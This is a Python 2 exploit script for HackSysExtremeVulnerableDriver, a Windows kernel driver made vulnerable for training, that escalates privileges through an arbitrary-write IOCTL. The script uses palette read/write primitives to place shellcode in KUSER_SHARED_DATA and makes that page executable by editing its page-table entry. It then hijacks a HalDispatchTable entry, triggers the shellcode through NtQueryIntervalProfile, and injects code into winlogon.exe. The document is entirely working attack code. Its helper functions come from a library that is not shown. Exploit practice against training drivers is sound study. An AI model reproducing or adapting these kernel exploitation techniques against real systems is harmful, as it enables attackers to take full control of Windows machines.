from kex import *
from ctypes import *
from ctypes.wintypes import *
import struct, sys, os, time

if __name__ == '__main__':
	print "[*] HackSysExtremeVulnerableDriver Arbitrary Overwrite privilige escalation"
	
	IOCTL_VULN	= 0x0022200b # 
	DEVICE_NAME   = "\\\\.\\HackSysExtremeVulnerableDriver"
	dwReturn	  = c_ulong()
	driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
	if driver_handle == INVALID_HANDLE_VALUE:
		print "[-] Coudn't open driver, exiting..."
		sys.exit(-1)
	
	(what, where, manager_palette, worker_palette) = get_www_address_and_palettes()
	input = struct.pack("<Q", addressof(what)) 
	input += struct.pack("<Q", where) 

	inputbuffer = id(input) + 32
	print "[*] Input buffer is at: %s" % hex(inputbuffer)
	inputbuffer_size  = len(input)
	outputbuffer_size = 0x0
	IoStatusBlock = c_ulong()
	print "[*] Talking to the driver sending vulnerable IOCTL..."
	dev_ioctl = ntdll.ZwDeviceIoControlFile(driver_handle,
								   None,
								   None,
								   None,
								   byref(IoStatusBlock),
								   IOCTL_VULN,
								   inputbuffer,
								   inputbuffer_size,
								   None,
								   0x0
								   )
	sc = create_string_buffer(privilege_shellcode_x64(''))
	print "[*] Writing shellcode to KUSER_SHARED_DATA"
	write_memory_palette(manager_palette, worker_palette, get_kuser_shared_data()+0x800, byref(sc), sizeof(sc));

	print "[*] Convert KUSER_SHARED_DATA to executable with modifying PTE"
	make_memory_executable_palette(manager_palette, worker_palette, get_kuser_shared_data()+0x800)
	hal = leak_haldispatchtable_palette(manager_palette, worker_palette)

	print "[*] Saving HalDispatchTable entry"
	hal_entry_original = c_ulonglong()
	read_memory_palette(manager_palette, worker_palette, hal + 0x8, byref(hal_entry_original), sizeof(hal_entry_original))

	print "[*] Overwriting HalDispatchTable entry"	
	sc_address = c_ulonglong(get_kuser_shared_data()+0x800)
	write_memory_palette(manager_palette, worker_palette, hal + 0x8, byref(sc_address), sizeof(sc_address));
	res = c_ulonglong()

	print "[*] Triggering shellcode"
	ntdll.NtQueryIntervalProfile(2, byref(res))

	print "[*] Restore HalDispatchTable entry"
	write_memory_palette(manager_palette, worker_palette, hal + 0x8, byref(hal_entry_original), sizeof(hal_entry_original));
	
	print "[*] Injecting shellcode into winlogon.exe"
	inject_shell(manager_palette, worker_palette)

